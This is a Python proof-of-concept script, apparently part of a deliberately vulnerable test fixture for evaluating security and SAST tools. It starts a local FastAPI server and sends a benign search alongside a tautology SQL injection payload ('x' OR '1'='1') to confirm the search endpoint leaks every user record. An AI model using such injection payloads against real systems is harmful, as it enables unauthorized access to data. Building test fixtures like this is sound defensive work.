#!/usr/bin/env python3
"""
PoC for subtle SQL injection in sql-injection-subtle-python (FastAPI).
Starts the server, sends benign and malicious requests, reports whether
the injection was observable. For use when testing security/SAST tools.
"""
import subprocess
import sys
import time
import urllib.request
import urllib.error
import urllib.parse
import os

BASE = "http://localhost:8080"
SERVER_PID = None


def get(url: str) -> str:
    try:
        with urllib.request.urlopen(url, timeout=5) as r:
            return r.read().decode()
    except urllib.error.HTTPError as e:
        return (e.read().decode() if e.fp else "")
    except Exception as e:
        return str(e)


def start_server() -> None:
    global SERVER_PID
    root = os.path.dirname(os.path.abspath(__file__))
    proc = subprocess.Popen(
        [sys.executable, "-m", "uvicorn", "app.main:app", "--host", "127.0.0.1", "--port", "8080"],
        cwd=root,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    SERVER_PID = proc.pid
    for _ in range(25):
        try:
            body = get(BASE + "/")
            if body and "Subtle" in body:
                break
        except Exception:
            pass
        time.sleep(0.4)
    else:
        print("Server did not start")
        try:
            proc.terminate()
        except Exception:
            pass
        sys.exit(1)


def stop_server() -> None:
    global SERVER_PID
    if SERVER_PID:
        try:
            os.kill(SERVER_PID, 15)
        except Exception:
            pass


def main() -> None:
    root = os.path.dirname(os.path.abspath(__file__))
    os.chdir(root)
    start_server()
    try:
        # Benign
        r = get(BASE + "/users/search?q=alice")
        ok_normal = "alice" in r and "users" in r

        # SQLi: return all users via OR 1=1
        payload = "x' OR '1'='1"
        r = get(BASE + "/users/search?q=" + urllib.parse.quote(payload))
        ok_injection = "admin" in r and "alice" in r and "bob" in r

        print("Normal query (q=alice):", "PASS" if ok_normal else "FAIL")
        print("SQLi (q=... OR 1=1) returns all users:", "PASS (vuln)" if ok_injection else "FAIL")
        if ok_injection:
            print("\n[+] Subtle SQL injection confirmed (taint crosses route→service→repository→querybuilder).")
        else:
            print("\n[-] Injection not observable (server may be fixed or payload blocked).")
    finally:
        stop_server()


if __name__ == "__main__":
    main()
